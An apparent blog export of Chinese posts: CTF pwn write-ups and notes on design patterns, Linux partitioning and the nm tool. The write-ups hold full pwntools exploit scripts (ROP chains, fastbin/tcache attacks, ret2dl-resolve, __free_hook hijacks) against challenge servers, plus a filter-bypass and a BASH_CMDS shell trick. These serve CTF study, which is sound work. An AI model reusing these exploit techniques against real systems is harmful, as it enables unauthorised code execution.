    <content type="text"><![CDATA[your_pwn可重复利用的单字节读写的漏洞. 先直接读取栈上的返回地址泄露pie基址. 然后构造ROP链打印库函数地址泄露libc.直接调用system(binsh);获得flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = 'debug'pop_rdi_ret = 0xd03pop_rsi_r15_ret = 0xd01#r = process("./pwn")r = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")r.recvuntil("name:")r.sendline("w4rd3n")def get(p): i = 0 ll = 0 while(1): r.recvuntil("index\n") r.sendline(str(i + p)) data = r.recvuntil("value\n")[:-17] data = int(data[-2:],16) if(i &lt; 8): ll += data * (0x100 ** i) r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil("continue(yes/no)? \n") r.sendline("yes") return lldef write(p, x): i = 0 while(1): r.recvuntil("index\n") r.sendline(str(i + p)) r.recvuntil("value\n") data = 0 if(i != 40): data = (x[i/8] / (0x100 ** (i % 8))) % 0x100 r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil("continue(yes/no)? \n") r.sendline("yes") returnpie = get(0x158) - 0xb11print "pie: " + hex(pie)write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])libc = u64(r.recvuntil("\n")[0:6].ljust(8,'\0')) - 0x06f690print "libc: " + hex(libc)system = libc + 0x045390binsh = libc + 0x18cd57write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])r.interactive() dailyremove的时候没有对index进行范围检测. 先利用unsorted bin泄露libc,再利用fastbin单链表泄露heap基址. 申请一个chunk,在里面伪造一个堆指针和对应的faker chunk. free掉这个faker chunk,通过edit构造其fd到bss上,由于length可控,通过remove构造出一个chunk头部绕过检查. 成功fastbin attack,获得任意读写的能力,由于程序开了Full RELRO所以劫持__free_hook调用system(binsh);获得flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = 'debug'#r = process("./pwn")ptr = 0x602060r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")def show(): r.sendline(str(1)) data = r.recvuntil("Your choice:") return datadef add(length, content): r.sendline(str(2)) r.recvuntil("of daily:") r.sendline(str(length)) r.recvuntil("daily\n") r.send(content) r.recvuntil("Your choice:")def edit(index, content): r.sendline(str(3)) r.recvuntil("of daily:") r.sendline(str(index)) r.recvuntil("daily\n") r.send(content) r.recvuntil("Your choice:")def remove(index): r.sendline(str(4)) r.recvuntil("of daily:") r.sendline(str(index)) r.recvuntil("Your choice:")r.recvuntil("Your choice:")add(0x100, 'a')#0add(0x100, 'b')#1add(0x100, 'c')#2add(0x100, 'd')#3remove(0)remove(2)add(0x100, 'a' * 8)#0add(0x100, 'a' * 8)#2r.sendline(str(1))r.recvuntil("aaaaaaaa")heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220r.recvuntil("aaaaaaaa")libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78print "heap: " + hex(heap)print "libc: " + hex(libc)remove(0)remove(1)remove(2)remove(3)add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0add(0x20, 'a')#1add(0x50, 'a')#2add(0x20, 'a')#3remove((heap + 0x18 - ptr - 8) / 0x10)edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))remove(1)add(0x40, 'a')#1add(0x40, 'a')#4edit(4, p64(ptr))edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))edit(1, p64(libc + 0x045390))#gdb.attach(r)r.sendline(str(4))r.recvuntil("of daily:")r.sendline(str(2))r.interactive() baby_pwnret2dl in x86,没有可供leak的函数.保护很少,想起之前的0ctf2018 babystack,修改脚本直接打. 123456789101112131415161718192021222324252627import sysimport roputilsfrom pwn import *context.log_level = 'debug'#r = process("./pwn")r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")rop = roputils.ROP('./pwn')addr_bss = rop.section('.bss')buf1 = 'A' * 0x2cbuf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)r.send(buf1)buf2 = rop.string('/bin/sh')buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')buf2 += rop.fill(100, buf2)r.send(buf2)buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)r.send(buf3)#gdb.attach(r)r.interactive() Virtual理解程序逻辑. 首先是store_instruction函数将输入通过分隔符分类为各种操作符并保存在堆中,store_num同理. 其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据). 重点就是op函数. 这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里IDA反汇编有问题,没有识别出函数调用,实际上i会被赋值为函数调用的返回值. 这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先push. 关键函数是load和save,知道偏移就可以任意读写. 先使用load泄露堆上的堆地址,由于没开pie,通过-和/求出.got[puts]和此处偏移,再次load泄露libc,处理与system的偏移获得system地址. 不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得.got[puts]偏移,调用save成功劫持puts@plt. 突然发现username作用,开始试了/bin/sh,ls,cat flag什么的都是comment not found,最后/bin/bash成功. 1234567891011121314151617181920212223242526from pwn import *#context.log_level = 'debug'#r = process("./pwn")r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")r.recvuntil("Your program name:\n")r.sendline("/bin/bash")r.recvuntil("Your instruction:\n")payload = "push push push load push sub div sub load push add"payload += " push push push load push sub div sub save"#payload = "push push push load push sub div sub load pop"r.sendline(payload)#gdb.attach(r)r.recvuntil("Your stack data:\n")#payload = "-1 8 -5 4210720"payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"#0x404020 = 4210720,offset = -172800,one_gadget = -173178r.sendline(payload)#print r.recv()r.interactive() bms远端环境是libc2.26,可以使用tcache攻击,利用double free把chunk分配在stdout附近,使tcache bin指向_IO_2_1_stdout_. 修改结构体泄露libc,再次使用tcache攻击分配chunk到__free_hook,劫持为one_gadget,调用free获得shell. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'#r = process("./pwn")r = remote("39.106.224.151", "60002")def add(name, length, content): r.send(str(1)) r.recvuntil("book name:") r.send(name) r.recvuntil("description size:") r.send(str(length)) r.recvuntil("description:") r.send(content) r.recvuntil("&gt;\n")def remove(index): r.sendline(str(2)) r.recvuntil("index:") r.sendline(str(index)) r.recvuntil("&gt;\n")r.recvuntil("username:")r.send("admin\n\x00")r.recvuntil("password:")r.send("frame\n\x00")r.recvuntil("&gt;\n")add("a", 0xf0, "a")#0remove(0)remove(0)add("a", 0xf0, p64(0x602020))#1add("a", 0xf0, p64(0x602020))#2add("a", 0xf0, p8(0x20))#3r.send(str(1))r.recvuntil("book name:")r.send("a")r.recvuntil("description size:")r.send(str(0xf0))r.recvuntil("description:")r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4libc = u64(r.recvuntil("&gt;\n")[:6].ljust(8, '\0')) - 0x78460add("a", 0xe0, "a")#5remove(5)remove(5)add("a", 0xe0, p64(libc + 0x3dc8a8))#6add("a", 0xe0, p64(libc + 0x3dc8a8))#7add("a", 0xe0, p64(libc + 0x47c46))#8r.sendline(str(2))r.recvuntil("index:")r.sendline(str(5))#gdb.attach(r)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SE-设计模式-行为型]]></title>
    <url>%2Fposts%2F1e5cc14a%2F</url>
    <content type="text"><![CDATA[观察者模式意图:定义对象间的一种一对多的依赖关系,当一个对象的状态发生改变时,所有依赖于它的对象都得到通知并被自动更新. 适用性: 一个抽象模型有两个方面,其中一个方面依赖于另一方面. 对一个对象的改变需要同时改变其它对象,而不知道具体有多少对象有待改变. 一个对象必须通知其它对象,而它又不能假定其它对象是谁. 效果:目标和观察者间的抽象耦合.支持广播通信.意外的更新. 迭代子模式意图:提供一种方法顺序访问一个聚合对象中各个元素,而又不需暴露该对象的内部表示. 适用性: 访问一个聚合对象的内容而无需暴露它的内部表示. 支持对聚合对象的多种遍历. 为遍历不同的聚合结构提供一个统一的接口(支持多态迭代). 协作:Con.Ite跟踪聚合中的当前对象,并能够计算出待遍历的后继对象. 效果:支持以不同的方式遍历一个集合;迭代器简化了聚合的接口;在同一个聚合上可以有多个遍历. 责任链模式意图:使多个对象都有机会处理请求,从而避免请求的发送者和接收者之间的耦合关系.将这些对象连成一条链,并沿着这条链传递该请求,直到有一个对象处理它为止. 适用性: 有多个的对象可以处理一个请求,哪个对象处理该请求运行时刻自动确定. 想在不明确指定接收者的情况下向多个对象中的一个提交一个请求. 可处理一个请求的对象集合应被动态指定. 协作:当客户提交一个请求时,请求沿链传递直至一个有ConcreteHandler对象负责处理它. 备忘录模式意图:在不破坏封装性的前提下,捕获一个对象的内部状态,并在该对象之外保存这个状态.这样以后就可将该对象恢复到原先保存的状态. 适用性: 必须保存一个对象在某一个时刻的(部分)状态,这样以后需要时它才能恢复到先前的状态. 如果一个用接口来让其它对象直接得到这些状态,将会暴露对象的实现细节并破坏对象的封装性. 效果:保持封装;简化了原发器;可能代价很高;定义窄接口和宽接口;维护备忘录的潜在代价. 协作:管理器向原发器请求一个备忘录,保留一段时间后,将其送回给原发器;备忘录是被动的,只有创建备忘录的原发器会对它的状态进行赋值和检索. 命令模式意图:将一个请求封装为一个对象,从而使你可用不同的请求对客户进行参数化;对请求排队或记录请求日志,以及支持可撤消的操作. 适用性: 你可用过程语言中的回调函数表达这种参数化机制. 在不同的时刻指定,排列和执行请求. 支持取消操作. 效果:命令模式将调用操作的对象与知道如何实现该操作的对象解耦;命令是头等的对象,它们可像其他的对象一样被操纵和扩展;你可以将多个命令装配成一个复合命令;增加新的命令很容易,因为这无需改变已有的类. 状态模式意图:允许一个对象在其内部状态改变时改变它的行为.对象看起来似乎修改了它的类. 适用性: 一个对象的行为取决于它的状态,并且它必须在运行时刻根据状态改变它的行为. 一个操作中含有庞大的多分支的条件语句,且这些分支依赖于该对象的状态. 效果:将与特定状态相关的行为局部化;使得状态转换显式化;State对象可被共享. 访问者模式意图:表示一个作用于某对象结构中的各元素的操作.它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作. 适用性: 一个对象结构包含很多类对象,它们有不同的接口,而你想对这些对象实施一些依赖于其具体类的操作. 需要对一个对象结构中的对象进行很多不同的并且不相关的操作,而你想避免让这些操作污染这些对象的类. 协作:一个使用访问者模式的客户必须创建一个Con.Visitor对象,然后遍历该对象结构,并用该访问者访问每一个元素;当一个元素被访问时,它调用对应于它的类的访问者操作. 效果:易于增加新的操作;集中相关的操作而分离无关的操作;增加新的ConcreteElement类很困难. 解释器模式意图:给定一个语言,定义它的文法的一种表示,并定义一个解释器,这个解释器使用该表示来解释语言中的句子. 中介者模式意图:用一个中介对象来封装一系列的对象交互.中介者使各对象不需要显式地相互引用,从而使其耦合松散,而且可以独立地改变它们之间的交互. 策略模式意图:定义一系列的算法,把它们一个个封装起来,并且使它们可相互替换. 适用性: 许多相关的类仅仅是行为有异. 需要使用一个算法的不同变体. 算法使用客户不应该知道的数据. 一个类定义了多种行为,并且这些行为在这个类的操作中以多个条件语句的形式出现. 效果:一个替代继承的方法;消除了一些条件语句;实现选择;客户必须了解不同的Strategy;Strategy和Context之间的通信开销;增加了对象的数目; 模板方法模式意图:定义一个操作中的算法的骨架,而将一些步骤延迟到子类中.Template Method使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤. 适用性: 一次性实现一个算法的不变的部分,并将可变的行为留给子类来实现. 各子类中公共的行为应被提取出来并集中到一个公共父类中以避免代码重复. 控制子类扩展. 协作:ConcreteClass靠AbstractClass来实现算法中不变的步骤.]]></content>
      <categories>
        <category>SE</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SE-设计模式-结构型]]></title>
    <url>%2Fposts%2Faeb53b62%2F</url>
    <content type="text"><![CDATA[组合模式意图:将对象组合成树形结构以表示部分-整体的层次结构.组合模式使得用户对单个对象和组合对象的使用具有一致性. 适用性: 想表示对象的部分-整体层次结构. 希望用户忽略组合对象与单个对象的不同,用户将统一地使用组合结构中的所有对象. 协作:用户使用Component类接口与组合结构中的对象进行交互.若接收者是一个叶节点,则直接处理请求.否则将请求发送给它的子部件,在转发请求之前/之后可能执行一些辅助操作. 效果:定义了包含基本对象和组合对象的类层次结构;简化客户代码;使得更容易增加新类型的组件;使你的设计变得更加一般化. 装饰模式意图:动态地给一个对象添加一些额外的职责.就增加功能来说,Decorator模式相比生成子类更为灵活. 适用性: 不影响其他对象的情况下,以动态,透明的方式给单个对象添加职责. 处理那些可以撤消的职责. 不能采用生成子类的方法进行扩充时.一种情况是可能有大量独立的扩展,为支持每一种组合将产生大量的子类,使得子类数目呈爆炸性增长;另一种情况可能是因为类定义被隐藏,或类定义不能用于生成子类. 协作:Decorator将请求转发给他的Component对象,并有可能在转发前后执行一些附加的动作. 效果:比静态继承更加灵活;避免在层次结构高层的类有太多的特征;Decorator和它的Component不一样;有许多小对象. 代理模式意图:为其他对象提供一种代理以控制对这个对象的访问. 适用性:在需要用比较通用和复杂的对象指针代替简单的指针的时候,使用代理模式:远程代理,虚代理,保护代理,智能指引. 协作:代理根据其种类,在适当的时候向RealSubject转发请求. 效果:远程代理可以隐藏一个对象存在于不同地址空间的事实;虚代理可以进行最优化;保护代理和智能指引都允许在访问一个对象时有一些附加的内务处理. 享元模式意图:运用共享技术有效地支持大量细粒度的对象. 适用性: 一个应用程序使用了大量的对象. 完全由于使用大量的对象,造成很大的存储开销. 对象的大多数状态都可变为外部状态. 如果删除对象的外部状态,那么可以用相对较少的共享对象取代很多组对象. 应用程序不依赖于对象标识.由于享元对象可以被共享,对于概念上明显有别的对象,标识测试将返回真值. 协作:享元执行时所需的状态必定是内部的或外部的,内部状态存储于Con.Fly对象之中;而外部对象则由client对象存储或计算.当用户调用享元对象的操作时,将该状态传递给它.用户不应该直接对Con.Fly类实例化,而只能从Fly.Fac对象得到Con.Fly对象,这可以保证对它们适当地进行共享. 外观模式意图:为子系统中的一组接口提供一个一致的界面,Facade模式定义了一个高层接口,这个接口使得这一子系统更加容易使用. 适配器模式意图:将一个类的接口转换成客户希望的另外一个接口.Adapter模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作. 适用性: 你想使用一个已经存在的类,而它的接口不符合你的需求. 你想创建一个可以复用的类,该类可以与其他不相关的类或不可预见的类(即那些接口可能不一定兼容的类)协同工作. (仅适用于对象适配器)你想使用一些已经存在的子类,但是不可能对每一个都进行子类化以匹配它们的接口.对象适配器可以适配它的父类接口. 协作:客户在适配器实例上调用一些操作.接着适配器调用Adapter的操作实现这个请求. 桥梁模式意图:将抽象部分与它的实现部分分离,使它们都可以独立地变化. 适用性: 你不希望在抽象和它的实现部分之间有一个固定的绑定关系. 类的抽象以及它的实现都应该可以通过生成子类的方法加以扩充. 对一个抽象的实现部分的修改应对客户不产生影响,即客户的代码不必重新编译. (C++)你想对客户完全隐藏抽象的实现部分. 有许多类要生成. 你想在多个对象间共享实现(可能使用引用计数),但同时要求客户并不知道这一点. 协作:Abstraction将client的请求转发给它的Implementor对象. 效果:分离接口及其实现部分;提高可扩充性;实现细节对客户透明.]]></content>
      <categories>
        <category>SE</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SE-设计模式-创建型]]></title>
    <url>%2Fposts%2F27af5455%2F</url>
    <content type="text"><![CDATA[工厂方法模式意图:定义一个用于创建对象的接口,让子类决定实例化哪一个类.Factory Method使一个类的实例化延迟到其子类. 适用性: 当一个类不知道它所必须创建的对象的类的时候. 当一个类希望由它的子类来指定它所创建的对象的时候. 当类将创建对象的职责委托给多个子类中的某一个,并且希望将哪一个子类是代理者这一信息局部化的时候. 协作:Creator依赖于它的子类来定义工厂方法,所以它返回一个适当的Concrete Concrete Product实例. 效果:为子类提供hook;连接平行的各层次. 单例模式意图:保证一个类只有实例,并提供访问它的全局点.(提供一个允许用户看见这实例的唯一接口) 适用性: 当类只能有一个实例而且客户可以从众所周知的访问点它时. 当这个唯一实例应是通过子类化可扩展的,而且客户该无需更改代码就能使用这个唯一扩展的实例时. 协作:客户只能通过单例的Instance操作访问一个单例的实例. 效果:对唯一实例的受控访问;缩小名称空间;允许对操作和表示的精化;允许可变数目的实例;比类操作更灵活;缺少弹性;不可扩展. 抽象工厂模式意图:提供一个创建系列相关或相互依赖对象的接口,而无需指定它们具体的类. 适用性: 一个系统要独立于它的产品创建组合和表示时. 一个系统要由多个产品系列中的一个来配置时. 当你强调一系列相关产品对象的设计以便进行联合使用时. 当你提供一个产品类库而只想显示它们的接口而不是实现时. 协作:在运行时刻创建一个ConcreteFactory类的实例,这一具体的工厂创建具有特定实现的产品对象.为创建不同产品对象客户应使用不同的具体工厂.抽象工厂将产品对象的创建延迟到它的ConcreteFactory子类. 效果:分离了具体的类;使得易于交换产品系列;有利于产品的一致性;难以支持新种类的产品. 生成器模式意图:将一个复杂对象的构建与它的表示分离,使得同样的构建过程可以创建不同的表示. 适用性: 当创建复杂对象的算法应该独立于该对象的组成部分以及它们的装配方式时. 当构造过程必须允许被构造的对象有不同表示时. 协作:客户创建Director对象并用它所想要的生成器对象进行配置.一旦产品部件被生成,导向器就会通知生成器.生成器处理导向器的请求,并将部件添加到该产品中.客户从生成器中检索产品. 效果:使你可以改变一个产品的内部表示;将构造代码和表示代码分开;使你可对构造过程进行更精细的控制. 原型模式意图:用原型实例制定创建对象的种类,并且通过拷贝这些原型创建新的对象. 适用性: 当一个系统应该独立于它的产品创建,构成和表示时. 当要实例化的类是在运行时刻指定时. 为了避免创建一个与产品类层次平行的工厂类层次时. 当一个类的实例只能有几个不同状态组合中的一种时. 协作:客户请求一个原型克隆自身. 效果:运行时刻增加和删除产品;改变值以指定新对象;改变结构以指定新对象;减少子类的构造;用类动态配置应用;每一个Prototype的子类都必须实现Clone操作,可能很困难.]]></content>
      <categories>
        <category>SE</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-Linux-磁盘分区]]></title>
    <url>%2Fposts%2Fa1d1c6d5%2F</url>
    <content type="text"><![CDATA[磁盘连接方式个人计算机常见磁盘接口有IDE和SATA,后者是现在主流. 一个IDE扁平电缆可以连接两个IDE设备(区分为主设备和从设备),通常主机会提供两个IDE接口IDE1(primary)和IDE2(secondary). 12345+----------------------------------+|IDE\Jumper | Master | Slave ||IDE1 | /dev/hda | /dev/hdb ||IDE2 | /dev/hdc | /dev/hdd |+----------------------------------+ 由于SATA/USB/SCSI等磁盘接口都是使用SCSI模块来驱动,所以这些接口的磁盘设备文件名都是/dev/sd[a-p]的格式. 具体磁盘文件名由Linux内核检测到磁盘的顺序. 主引导分区和分区表磁盘数据读写在盘片上,盘片又可以分出扇区与柱面两种单位,其中扇区大小为512bytes. 磁盘的第一个扇区十分重要,因为其记录了两个重要的信息: 主引导分区(MBR):可以安装引导加载程序的地方,由446bytes. 分区表(partition table):记录整块硬盘分区的状态,有64bytes. 标记字节:55,AA. 磁盘分区表分区表分为四组记录区,每组记录区记录了该区段的起始与结束的柱面号码.分区的最小单位就是柱面. 假如当前设备文件名为/dev/hda,那么四个分区的设备文件名为/dev/hda[1-4],数字与分区位置相关. 由于分区表只有64bytes,最多容纳四个分区(分为主或扩展分区). 其中扩展分区的目的是使用额外的扇区记录分区信息.而由扩展分区继续切出来的分区叫做逻辑分区.(逻辑分区数字从5开始) 开机流程CMOS是记录各项硬件参数且嵌入在主板上的存储器.而BIOS则是一个写入到主板上的一个韧体(即写入到硬件上的软件程序),同时也是开机时计算机系统会主动执行的第一个程序. BIOS会根据用户设置去获取能开机的硬盘,并到该硬盘去读取第一个扇区的MBR位置,然后运行MBR中的引导加载程序. 而引导加载程序目的时加载内核文件,之后由内核文件进行工作. 其中引导加载程序的主要功能有: 提供开机选项菜单. 载入内核文件. 转交其他loader. 引导加载程序除了可以安装在MBR之外,还可以安装在每个分区的引导扇区,而实际可开机的内核文件是放置到各分区,loader只认识自己系统分区内的可开机文件和其他loader. 只有第一个可开机设备内的MBR会被系统主动读取. 磁盘分区选择Linux所有数据都是以文件形态呈现的,形成一个目录树结构,其中最重要的就是/,也就是根目录. mount就是利用一个目录当成进入点,将磁盘分区的数据放置在该目录下. Linux支持的文件系统类型 ext2/ext3:是Linux适用的文件系统类型. physical volume(LVM):用来弹性调整文件系统大小的一种机制,可以让你的文件系统大小变化而不改变原有的文件数据的内容. software RAID:利用Linux操作系统特性,用软件仿真出磁盘阵列的功能. swap:内存交换空间.不需要挂载点. vfat:同时被Linux和Windows支持的文件系统类型. 常用分区方案 /boot:primary - etx3. /:primary - etx3. /home:primary - etx3. swap:logival - swap.]]></content>
      <categories>
        <category>CS</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-xyz]]></title>
    <url>%2Fposts%2F852f801%2F</url>
    <content type="text"><![CDATA[Welcomemalloc失败并不会退出程序,而是返回null(也就是0). 所以只要输入一个足够大的数字就可以使malloc返回0,结合v5[size - 1] = 0;可以写到目的地. sub虽然读入用的是%u,但变量是int类型,所以输入对应负数的补码的十进制形式即可. add数组越界,写偏移13到返回地址即可,第二次input输入字母跳出循环.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-susctf-2019]]></title>
    <url>%2Fposts%2Fe67f3bea%2F</url>
    <content type="text"><![CDATA[checkin检测子字符串sh. 执行s\h绕过检测. pwn_collection里外都有uaf,里面的note大小可控(小于0x5f). 利用double free进行fastbin attack,找到合适的偏移成功泄露libc,然后又找到个偏移写free@plt. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *context.log_level = 'debug'ptr = 0x602160r = remote("211.65.197.117", "10008")# r = process("./pwn_collection")r.recvuntil("chioce&gt;")r.sendline("1")r.recvuntil("input your name(no more than 20)\n&gt;")r.sendline("cws")r.recvuntil("input password\n&gt;")r.sendline("cws")r.recvuntil("chioce&gt;")r.sendline("2")r.recvuntil("input your index\n")r.sendline("0")r.recvuntil("input your password\n&gt;")r.sendline("cws")def add(size, content):​ r.sendline("1")​ r.recvuntil("input your note length\n")​ r.sendline(str(size))​ r.recvuntil("input your note\n")​ r.send(content)​ r.recvuntil("chioce&gt;")def check(id):​ r.sendline("2")​ r.recvuntil("input your note idx\n")​ r.sendline(str(id))​ data = r.recvuntil("not")​ data = data[:-12]​ r.recvuntil("chioce&gt;")​ return datadef dele(id):​ r.sendline("3")​ r.recvuntil("input your note idx\n")​ r.sendline(str(id))​ r.recvuntil("chioce&gt;")r.recvuntil("chioce&gt;")add(0x30, "a")#0add(0x30, "b")#1add(0x30, "c")#2dele(0)#1dele(1)#0dele(0)#noneheap = u64(check(0)[0:8].ljust(8, '\0')) - 0xb0add(0x30, p64(0x602062))#0add(0x30, p64(0x602062))#1add(0x30, p64(0x602062))#2add(0x30, "/bin/sh;aaaaaa")#3system = u64(check(3)[14:14 + 8].ljust(8, '\0')) - 0x3c5620 + 0x45390# print "system: " + hex(system)add(0x50, "a")#0add(0x50, "b")#1add(0x50, "c")#2dele(4)#1dele(5)#0dele(4)#noneadd(0x50, p64(0x601ffa))#0add(0x50, p64(0x601ffa))#1add(0x50, p64(0x601ffa))#2add(0x50, p64(0)[2:] + p64(0) + p64(system))#3r.sendline("3")r.recvuntil("input your note idx\n")r.sendline(str(3))# gdb.attach(r)r.interactive() ret2moon由于后门函数和main函数的差别只有一个字节,修改v2从而赋值操作作用于返回地址,然后写一字节即可. tcache_pwn简单的tcache攻击,double free后修改fd,再次malloc修改目标地址. 先泄露libc然后劫持free@plt即可. testFile程序主逻辑. 即不断把输入字符和其在字符串中的偏移是否与5个int共20个字节一一相等. 真假校徽Linux下compare一下. minBash利用已知bash漏洞:BASH_CMDS[a]=/bin/sh;a. PCAP打开浏览,发现有价值的就这一段,明显是base64. 解码,明显是zip文件,利用文件内的密码解压即得到flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-nm]]></title>
    <url>%2Fposts%2F2359ad51%2F</url>
    <content type="text"><![CDATA[功能可以查看动态和静态库中的符号.列出.o,.a,.so中的符号信息,包括符号的值,类型及名称等. 使用最好先用file查看对象文件所属处理器架构,然后再用相应交叉版本的nm工具. 1nm [option(s)] [file(s)] 有用的options. –help:显示nm的选项. -a或–debug-syms:显示所有的符号,包括debugger-only symbols; -A:在每个符号信息的前面打印所在对象文件名称; -B:等同于–format=bsd,用来兼容MIPS的nm; -C:输出demangle过了的符号名称,为了区分重载函数C++编译器会将函数返回值/参数等信息附加到函数名称中去形成一个mangle过的符号; –no-demangle:默认的选项,不需要将低级符号名解析成用户级名; -D:打印动态符号; -e:列出文件的静态和外部符; -f format:使用format格式输出.format可以选取bsd,sysv或posix,该选项在GNU的nm中有用.默认为bsd; -g或–extern-only:仅显示外部符号; -l或–line-numbers:使用对象文件中的调试信息打印出所在源文件及行号,必须保证你的对象文件中带有符号调式信息,这一般要求你在编译的时候指定一个-g选项; -p或–no-sort:按目标文件中遇到的符号顺序显示,不排序; -P或–portability:使用POSIX.2标准输出格式代替默认的输出格式.等同于使用任选项-f posix; -s或–print-armap:当列出库中成员的符号时,包含索引.索引的内容包含,哪些模块包含哪些名字的映射; –size-sort:按大小排列符号顺序.该大小是按照一个符号的值与它下一个符号的值进行计算的; -n,-v或–numeric-sort:按符号对应地址的顺序排序,而非按符号名的字符顺序; -r或–reverse-sort:反转排序顺序; –target=bfdname:指定一个目标代码的格式,而非使用系统的默认格式; -u或–undefined-only:打印出那些未定义的符号; -V或–version:显示nm的版本号; -x:以十六进制显示符号大小和值; -X64:显示所有64位对象符号,忽略所有32位对象符号; –defined-only:仅显示定义的符号; 符号类型对于每一个符号来说,其类型如果是小写的,则表明该符号是local的;大写则表明该符号是global(external)的. A:该符号的值在今后的链接中将不再改变,常常出现在中断向量表中,例如用符号来表示各个中断向量函数在中断向量表中的位置; B:该符号放在BSS段中,通常是那些未初始化的全局变量; C:该符号为common,common symbol是未初始化数据段.只有在链接过程中才进行分配.符号的值表示该符号需要的字节数;例如在一个C文件中,定义int test,并且该符号在别的地方会被引用,则该符号类型即为C.否则其类型为B; D:该符号放在普通的数据段中,通常是那些已经初始化的全局变量; G:该符号也位于初始化数据段中.主要用于small object提高访问small data object的一种方式; I:该符号是对另一个符号的间接引用; N:该符号是一个debugging符号; R:该符号位于只读数据区; S:该符号位于非初始化数据区,用于small object; T:该符号放在代码段中,通常是那些全局非静态函数; U:该符号未定义过,需要自其他对象文件中链接进来; V:该符号是一个weak object. W:未明确指定的弱链接符号;同链接的其他对象文件中有它的定义就用上,否则就用一个系统特别指定的默认值;]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SE-设计模式-基础]]></title>
    <url>%2Fposts%2F93e1dc93%2F</url>
    <content type="text"><![CDATA[概念设计模式描述了软件设计过程中某一类常见问题的一般性的解决方案. 面向对象设计模式描述了面向对象设计过程中,特定场景下类与相互通信的对象之间常见的组织关系. 原则设计模式就是实现以下原则从而达到代码复用,增加可维护性的目的. 单一职责原则(SRP) 一个类应仅有一个引起它变化的原因. 每一个引起类变化的原因就是一个职责,每个类应仅有一个职责. 每一个职责都是一个变化的轴线,当需求变化时会反映为类的职责的变化. 开闭原则(OCP)软件对扩展是开放的,对修改是关闭的.开发一个软件时,应可以对其进行功能扩展(开放),在进行扩展的时候,不需要对原来的程序进行修改(关闭). 抽象:把系统的所有可能的行为抽象成一个底层;由于可从抽象层导出一个或多个具体类来改变系统行为,因此对于可变部分,系统设计对扩展是开放的. 可变性封装:对系统所有可能发生变化的部分进行评估和分类,每一个可变的因素都单独进行封装. Liskov替换原则(LSP)继承必须确保超类所拥有的性质在子类中仍然成立,当一个子类的实例能够替换任何其超类的实例时,它们之间才具有is-A关系. 接口隔离原则(ISP) 多个和客户相关的接口要好于一个通用接口. 如果一个类有几个使用者,与其让这个类载入所有使用者需要使用的所有方法,还不如为每个使用者创建一个特定接口,并让该类分别实现这些接口. 依赖倒置原则(DIP）定义: 高层模块不应依赖低层模块,二者都应该依赖于抽象. 高层模块只应该包含重要的业务模型和策略选择,低层模块则是不同业务和策略的实现. 高层抽象不依赖高层和低层模块的具体实现,最多只依赖于低层的抽象. 低层抽象和实现也只依赖于高层抽象. 辅助原则: 变量尽量不持有一个指向具体类的引用,而是接口或者抽象类. 任何方法尽量不覆盖其任何基类中已经实现了的方法. 结合里氏替换原则使用. 分类创建型:用来创建对象的模式,抽象了实例化过程; 结构型:讨论类和对象的结构,采用继承机制来组合接口或实现(类结构型模式),或者通过组合一些对象来实现新的功能(对象结构型模式); 行为型:解决的是类实体之间的通讯关系,希望以面向对象的方式描述一个控制流程; 基本要素模式名称(Pattern Name). 